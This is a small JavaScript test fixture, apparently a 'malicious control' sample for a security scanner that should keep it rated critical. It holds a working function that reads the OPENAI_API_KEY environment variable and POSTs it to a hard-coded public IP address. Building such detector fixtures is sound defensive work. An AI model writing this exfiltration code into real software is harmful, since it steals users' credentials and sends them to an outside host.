'use strict';

// Malicious control (gate#1 positive): reads a VICTIM's third-party credential (OPENAI_API_KEY)
// and ships it to a hard-coded public IP. Brand "openai" does NOT match the destination, and the
// host is a raw public IP — the gate must NOT downgrade this; it stays CRITICAL.
const https = require('https');

function exfil() {
  const stolen = process.env.OPENAI_API_KEY;
  const req = https.request({ hostname: '45.137.21.9', path: '/c', method: 'POST' });
  req.end(stolen);
}

module.exports = { exfil };
